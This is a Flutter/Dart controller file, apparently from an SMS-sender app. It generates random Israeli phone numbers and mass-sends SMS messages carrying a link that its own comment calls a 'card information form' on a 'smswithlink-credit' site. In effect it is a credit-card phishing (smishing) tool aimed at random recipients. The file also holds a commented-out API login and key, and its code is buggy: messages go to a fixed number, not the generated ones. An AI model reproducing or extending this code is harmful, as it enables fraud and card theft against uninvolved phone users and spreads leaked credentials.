import 'dart:convert';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:http/http.dart' as http;
import 'package:smssenderwithlink/constants/appConnstants/app_const.dart';
import 'package:smssenderwithlink/ui/home_page.dart';

class SMSController extends GetxController {
//   const api_login = 'aboodjob@gmail.com';
// const api_key = 'Hnuo1ODKkXS24bsqZEmeMtfP7vy96Qpw';

  final RxList<String> generatedPhoneNumbers = <String>[].obs;
  final amountController = TextEditingController().obs;

   generatePhoneNumber() async {
    print('generate method enter ');
      print("amoiunt =  ${amountController.value.text}" ?? '0');
    if (amountController.value.text == '' ||
        amountController.value.text == '0') {
      generatedPhoneNumbers.clear();
       const SnackBar(
        duration: Duration(seconds: 3),
        dismissDirection: DismissDirection.startToEnd,
        shape: BeveledRectangleBorder(),
        showCloseIcon: bool.fromEnvironment("exit"),
        content: Text(
            'You should have a list of phone numbers, /n Please enter the amount of phone numbers you want to generate'),
      );

    }
    else
    {
      for (int i = 0;
          i <
              int.parse(
                amountController.value.text,
              );
          i++) {
        var temp = generateIsraelPhoneNumber();
        generatedPhoneNumbers.add(temp);
        print('phoen number in generrrrr  = $temp');

      }
    }
   }

// Generate a unique link or use your own link to the card information form
  String? uniqueLink = 'https://smswithlink-credit.netlify.app';

  final _israelPhoneNumberRegex = r'^009725\d{8}$';

  String generateIsraelPhoneNumber() {
    // print
    print('generateIsraelPhoneNumber ------------------------------------');
    var phoneNumber = '';
    print('phoen number in generrrrr  = $phoneNumber');
    do {
      print('phoen number in generrrrr in dooooo = $phoneNumber');

      phoneNumber = '009725${Random().nextInt(100000000)}';
    } while (!validateIsraelPhoneNumber(phoneNumber));
    return phoneNumber;
  }

  bool validateIsraelPhoneNumber(String phoneNumber) {
    // print
    print('validateIsraelPhoneNumber ------------------------------------');
    final regex = RegExp(_israelPhoneNumberRegex);

    return regex.hasMatch(phoneNumber);
  }
  sendSmsToGroup()async{

    for (int i=0; i< generatedPhoneNumbers.length;i++){
      await sendSms(num: generatedPhoneNumbers[i], );
    }

  }
  sendSms({  required String num}) async{

try{

          final 
        response = await http.post(
        Uri.parse( AppConst.textEndPoint),
        headers: {
          // 'Content-Type': 'application/json'
          
          },
          body:{
          'key': AppConst.apiKey,
          'sender':AppConst.senderId,
          'message':AppConst.message,
          'phone':AppConst.myNum
        },
        
      );

      if (response.statusCode == 200) {
        // SMS sent successfully
        print('SMS sent successfully');
      } else {
        // Handle error
        print('Error sending SMS: ${response.body}');
      }
      // Rest of the function remains the same
    } catch (e) {
      // Handle error
      print('Error sending SMS: $e');
    }
  }

}
